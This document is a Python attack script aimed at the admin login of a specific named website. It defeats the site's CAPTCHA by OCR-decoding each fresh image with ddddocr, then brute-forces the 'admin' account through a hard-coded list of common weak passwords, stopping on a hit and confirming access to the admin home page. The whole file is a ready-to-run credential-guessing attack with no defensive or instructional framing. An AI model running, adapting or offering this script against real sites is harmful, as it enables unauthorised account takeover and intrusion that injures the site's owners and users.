#!/usr/bin/env python3
"""zhongsheng full login: checkcode OCR + weak pw brute"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://zhongshengjinshuzhipin.com"
LOGIN_URL = "/index.php?g=admin&m=public&a=login"
CAP_URL = "/index.php?g=api&m=checkcode&a=index&length=4&font_size=20&width=248&height=42&use_noise=1&use_curve=0"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None, raw=False):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        body = r.read()
        return r.status, r.geturl(), (body if raw else body.decode("utf-8", "ignore"))
    except urllib.error.HTTPError as e:
        return e.code, url, (e.read(5000) if raw else e.read(5000).decode("utf-8", "ignore"))
    except Exception as ex:
        return 0, url, str(ex)

def ocr_img(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

PWS = ["admin", "admin123", "123456", "admin888", "12345678", "admin@123", "a123456",
       "admin666", "admin123456", "password", "888888", "zhongsheng", "zs123456"]

op, cj = get_opener()
code, final, body = fetch(op, HOST + LOGIN_URL)
print("login page: %s size=%d" % (code, len(body)), flush=True)

for pw in PWS:
    # fresh captcha
    code, final, cap = fetch(op, HOST + CAP_URL, raw=True, referer=HOST + LOGIN_URL)
    if isinstance(cap, str) or len(cap) < 100:
        print("  captcha fail (%s)" % str(cap)[:30], flush=True)
        time.sleep(1)
        continue
    verify = ocr_img(cap)
    if not verify:
        continue
    data = urllib.parse.urlencode({"username": "admin", "password": pw, "verify": verify})
    code, final, body = fetch(op, HOST + LOGIN_URL, data=data, referer=HOST + LOGIN_URL)
    # success: redirect to admin home or JSON success
    ok = ("g=admin&m=index" in final) or ("g=admin" in final and "login" not in final) or ('"status":1' in body)
    print("admin/%s: code=%s verify=%s final=%s ok=%s" % (pw, code, verify, final[:60], ok), flush=True)
    if ok:
        print("!!! HIT admin/%s" % pw, flush=True)
        # verify admin home
        code, final, body2 = fetch(op, HOST + "/index.php?g=admin&m=index&a=index", referer=HOST + LOGIN_URL)
        print("admin home: %s size=%d logout=%s" % (code, len(body2), "退出" in body2), flush=True)
        break
